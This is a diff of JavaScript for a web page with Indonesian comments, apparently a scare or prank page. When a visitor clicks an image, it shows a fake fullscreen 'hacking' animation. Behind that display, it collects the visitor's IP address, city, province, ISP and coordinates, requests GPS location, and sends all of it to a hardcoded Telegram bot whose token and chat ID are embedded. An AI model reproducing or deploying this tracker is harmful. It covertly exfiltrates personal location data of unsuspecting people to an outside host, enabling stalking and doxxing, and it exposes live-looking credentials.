@@ -69,11 +69,10 @@
         const suaraKetik = document.getElementById('suara-ketik');
         const suaraAlert = document.getElementById('suara-alert');
 
-        // --- DATA INTEGRASI ---
+        // --- DATA TELEGRAM ---
         const TOKEN_BOT = "8110303835:AAHEOijWAE5EnMK_mkseIvru6vSbsp3PCUU"; 
         const CHAT_ID = "7332180572"; 
-        const IPINFO_TOKEN = "6dd4d76f655366"; 
-        // ----------------------
+        // ---------------------
 
         const pesanAwal = [
             "> Initializing exploit mechanism...",
@@ -96,39 +95,34 @@
 
         function kirimTele(teks) {
             const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`;
-            fetch(url).catch(() => console.log("Koneksi gagal"));
+            fetch(url).catch(() => {});
         }
 
-        // Lapis 1: IP Tracking + Provinsi (Otomatis)
+        // Lapis 1: Pakai ipapi.co (Lebih stabil di Indonesia)
         async function ambilDataIP() {
             try {
-                const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 
-                // Laporan ke Telegram
                 const laporan = `
 🌐 *TARGET TERDETEKSI (IP)*
 🔌 *IP:* ${data.ip}
 🏙️ *Kota:* ${data.city}
 🇮🇩 *Provinsi:* ${data.region}
 🏢 *ISP:* ${data.org}
-📍 *Koordinat:* ${data.loc}
+📍 *Koordinat:* ${data.latitude},${data.longitude}
                 `;
                 kirimTele(laporan);
 
-                // Tampilkan data asli di layar target (Warna Kuning agar menonjol)
-                logHacker.innerHTML += `<span style="color: yellow;">> DETECTING IP: ${data.ip}</span><br>`;
+                logHacker.innerHTML += `<span style="color: yellow;">> IP: ${data.ip} DETECTED</span><br>`;
                 logHacker.innerHTML += `<span style="color: yellow;">> REGION: ${data.region}</span><br>`;
                 logHacker.innerHTML += `<span style="color: yellow;">> ISP: ${data.org}</span><br>`;
-                
-                return true;
             } catch (err) {
                 kirimTele("⚠️ Gagal mengambil data IP.");
-                return false;
             }
         }
 
-        // Lapis 2: GPS Presisi (Izin User)
+        // Lapis 2: GPS Presisi (Wajib Izin)
         function ambilGPS() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
@@ -144,45 +138,33 @@
             if (index < arrayPesan.length) {
                 suaraKetik.currentTime = 0;
                 suaraKetik.play().catch(() => {}); 
-
                 if (arrayPesan[index].includes("WARNING") || arrayPesan[index].includes("HACKED")) {
                     suaraAlert.currentTime = 0;
                     suaraAlert.play().catch(() => {});
                 }
-
                 logHacker.innerHTML += arrayPesan[index] + "<br>";
                 layarHack.scrollTop = layarHack.scrollHeight;
-                
-                // Tunggu sebentar tiap baris (450ms)
-                await new Promise(resolve => setTimeout(resolve, 450));
+                await new Promise(r => setTimeout(r, 450));
                 return jalankanAnimasi(arrayPesan, index + 1);
             }
         }
 
         gambar.addEventListener('click', async () => {
-            // Unlocking Audio browser
             suaraKetik.play().then(() => {
                 suaraKetik.pause();
                 suaraAlert.play().then(() => suaraAlert.pause());
             }).catch(() => {});
 
             layarHack.style.display = 'block';
-            
-            // Fullscreen mode
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                document.documentElement.webkitRequestFullscreen();
-            }
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // URUTAN EKSEKUSI
-            await jalankanAnimasi(pesanAwal); // Munculkan teks pembuka
-            await ambilDataIP();              // Ambil IP & munculkan datanya di layar
-            ambilGPS();                       // Minta izin lokasi GPS
-            await jalankanAnimasi(pesanAkhir); // Selesaikan animasi teks
+            // Eksekusi
+            await jalankanAnimasi(pesanAwal);
+            await ambilDataIP(); 
+            ambilGPS(); 
+            await jalankanAnimasi(pesanAkhir);
         });
 
-        // Klik layar untuk kembali
         layarHack.addEventListener('click', () => {
             layarHack.style.display = 'none';
             if (document.exitFullscreen) document.exitFullscreen();
